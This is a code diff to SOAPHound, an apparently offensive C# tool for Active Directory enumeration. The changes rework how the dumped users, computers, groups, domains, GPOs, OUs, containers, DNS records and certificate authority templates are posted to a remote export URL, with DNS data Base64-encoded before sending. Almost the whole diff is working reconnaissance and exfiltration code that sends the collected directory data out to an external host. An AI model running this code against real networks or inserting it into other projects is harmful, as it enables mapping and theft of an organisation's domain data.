@@ -326,9 +326,9 @@ namespace SOAPHound
 
         private void DNSDump()
         {
-            List<ADObject> dnsobjects = ADWSUtils.GetObjects("dns");
-            
             string filecontent = "";
+            List<ADObject> dnsobjects = ADWSUtils.GetObjects("dns");
+
             foreach (ADObject dnsobject in dnsobjects)
             {
                 filecontent += "\r\n" + dnsobject.Name;
@@ -339,10 +339,16 @@ namespace SOAPHound
             string b64;
             b64 = Base64Encoder.EncodeToBase64(filecontent);
             // Console.WriteLine(b64 );
-            PostToUrl.PostMessage(exportUrl, "{\n\t\"payload\": \"" + b64 + "\"");
 
             Console.WriteLine("-------------");
-            Console.WriteLine("Output file generated in " + "c:\\" + "DNS.txt"); // FIX THIS
+            if (PostToUrl.PostMessage(exportUrl + "DNSDump", b64))
+            {
+                Console.WriteLine("DNS Dump exported: " + exportUrl + "DNSDump"); 
+            } else
+            {
+                Console.WriteLine("Failed to export DNS Dmp to: " + exportUrl + "DNSDump");
+            }
+
             dnsdump = false;
         }
 
@@ -406,12 +412,27 @@ namespace SOAPHound
             outputCA.meta.count = outputCA.data.Count();
             outputCATemplate.meta.count = outputCATemplate.data.Count();
             var jsonString = JsonConvert.SerializeObject(outputCA);
-            PostToUrl.PostMessage(exportUrl +"/CA.json", jsonString);
+
+            Console.WriteLine("-------------");
+            if (PostToUrl.PostMessage(exportUrl + "CA", jsonString))
+            {
+                Console.WriteLine("Posted to: " + exportUrl + "CA");
+            } else
+            {
+                Console.WriteLine("Failed to export CA to: " + exportUrl + "CA");
+            }
+            
 
             //Console.WriteLine(jsonString);
             jsonString = JsonConvert.SerializeObject(outputCATemplate);
-            PostToUrl.PostMessage(exportUrl + "/CATemplate.json", jsonString);
-            Console.WriteLine("Posted to /CATEmplate.json");
+            if (PostToUrl.PostMessage(exportUrl + "CATemplate", jsonString))
+            {
+                Console.WriteLine("Posted to : " + exportUrl + "CATemplate");
+
+            } else
+            {
+                Console.WriteLine("Failed to export CATemplate to: " + exportUrl + "/CATemplate");
+            }
             certdump = false;
         }
 
@@ -682,7 +703,7 @@ namespace SOAPHound
             {
                 var jsonString = JsonConvert.SerializeObject(outputUsers);
                 //File.WriteAllText(outputDirectory + r_header + ".json", jsonString);
-                PostToUrl.PostMessage(exportUrl+ "outputUsers.json" , jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputUsers" , jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -690,7 +711,7 @@ namespace SOAPHound
             if (outputComputers.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputComputers);
-                PostToUrl.PostMessage(exportUrl+ "outputComputers.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputComputers", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -698,7 +719,7 @@ namespace SOAPHound
             if (outputGroups.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputGroups);
-                PostToUrl.PostMessage(exportUrl+ "outputGroups.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputGroups", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -706,7 +727,7 @@ namespace SOAPHound
             if (outputDomains.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputDomains);
-                PostToUrl.PostMessage(exportUrl+ "outputDomains.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputDomains", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -714,7 +735,7 @@ namespace SOAPHound
             if (outputGPOs.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputGPOs);
-                PostToUrl.PostMessage(exportUrl+ "outputGPOs.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputGPOs", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -722,7 +743,7 @@ namespace SOAPHound
             if (outputOUs.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputOUs);
-                PostToUrl.PostMessage(exportUrl+ "outputOUs.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputOUs", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -730,7 +751,7 @@ namespace SOAPHound
             if (outputContainers.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputContainers);
-                PostToUrl.PostMessage(exportUrl+ "outputContainers.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "/outputContainers", jsonString);
                 //Console.WriteLine(jsonString);
             }
             Console.WriteLine("-------------");
